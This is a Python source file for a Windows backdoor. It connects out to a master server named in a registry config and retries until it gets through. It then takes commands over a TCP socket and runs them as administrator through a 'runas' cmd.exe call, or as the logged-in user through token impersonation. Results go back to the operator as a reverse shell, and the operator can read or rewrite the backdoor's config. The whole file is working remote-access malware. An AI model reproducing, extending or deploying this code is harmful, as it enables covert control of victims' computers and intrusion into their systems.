from local_libs.config import Config
from local_libs.env_vars import *
import win32comext.shell.shell as shell
import socket
import json
import time
import os

import win32ts
import win32profile
import win32process
import win32con


class Shell:
    @staticmethod
    def execute_user(command):
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        console_user_token = win32ts.WTSQueryUserToken(console_session_id)

        environment = win32profile.CreateEnvironmentBlock(console_user_token, False)

        startup_info = win32process.STARTUPINFO()
        startup_info.dwFlags = win32process.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = win32con.SW_NORMAL

        win32process.CreateProcessAsUser(console_user_token,
                                         fr"{command}",
                                         None,
                                         None,
                                         None,
                                         0,
                                         win32con.NORMAL_PRIORITY_CLASS,
                                         environment,
                                         None,
                                         startup_info)

    @staticmethod
    def execute_admin(command, output):
        shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe",
                             lpParameters=fr"/c {command} > {output}")


class BackdoorModules:
    def __init__(self):
        pass

    def handle_command(self, command):
        command = command.split(" ")
        action = command[1]
        if action == "load":
            pass
            # module_path = "C:\\Users\\User\\Desktop\\MalwareModules"
            # with open(module_path, "wb") as file:
            #     data = self.s.recv(1024)
            #     while data:
            #         file.write(data)
            #         data = self.s.recv(1024)
        elif action == "start" or action == "run":
            pass
        elif action == "stop" or action == "pause":
            pass
        elif action == "remove" or action == "delete":
            pass


class BackdoorConfig:
    def __init__(self):
        self.config = Config(winreg_key=DEFAULT_REG_KEY)

    def see(self):
        config_file = json.dumps(self.config.get().toDict(), indent=2)
        return config_file

    def change(self, new_config):
        self.config.set(new_config)
        return "Config was successfully updated"


class CommandHandler:
    def __init__(self, sock, commands_log):
        self.sock = sock
        self.commands_log = commands_log
        self.backdoor_config = BackdoorConfig()
        self.backdoor_modules = BackdoorModules()

    def handle(self, command):
        if command == "start shell":
            self.__send_reverse_msg()
        elif command == "hello":
            pass
        elif command == "see config":
            self.__send_reverse_msg(self.backdoor_config.see())
        elif command.find("change config") == 0:
            config = command.split(" ")[-1]
            self.__send_reverse_msg(self.backdoor_config.change(config))
        elif command.find("module") == 0:
            self.backdoor_modules.handle_command(command)
        else:
            self.__execute_shell(command)

    def __execute_shell(self, command):
        try:
            if command.find("cd") == 0:
                os.chdir(command[3:])
                self.__send_reverse_msg()
            else:
                Shell.execute_admin("chcp 65001 | " + command, self.commands_log)
                time.sleep(0.5)
                cmd_output = self.__get_cmd_output()
                self.__send_reverse_msg(f"{self.__get_ended_string(cmd_output)}Successfully executed")
        except Exception as error:
            self.__send_reverse_msg(f"Error: {error}")

    def __send_reverse_msg(self, msg=""):
        self.sock.send(f"{self.__get_ended_string(msg)}{os.getcwd()} >> ".encode("utf-8"))

    def __get_cmd_output(self):
        with open(self.commands_log) as f:
            return f.read()

    def __get_ended_string(self, string):
        if len(string) > 0:
            return string + "\n"
        else:
            return ""


class Backdoor:
    def __init__(self):
        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
        self.config = Config(winreg_key=DEFAULT_REG_KEY)

        self.sock = None
        self.server_ip = self.config.master_server["ip"]
        self.server_port = int(self.config.master_server["port"])

    def __connect_to_server(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                break
            except:
                continue

    def run(self):
        self.__connect_to_server()
        command_handler = CommandHandler(sock=self.sock, commands_log=self.commands_log_filepath)
        while True:
            try:
                received_command = self.sock.recv(1024 * 4).decode("utf-8")
                command_handler.handle(received_command)
            except ConnectionError:
                self.__connect_to_server()
            except socket.error:
                continue

    def __del__(self):
        self.sock.close()


if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
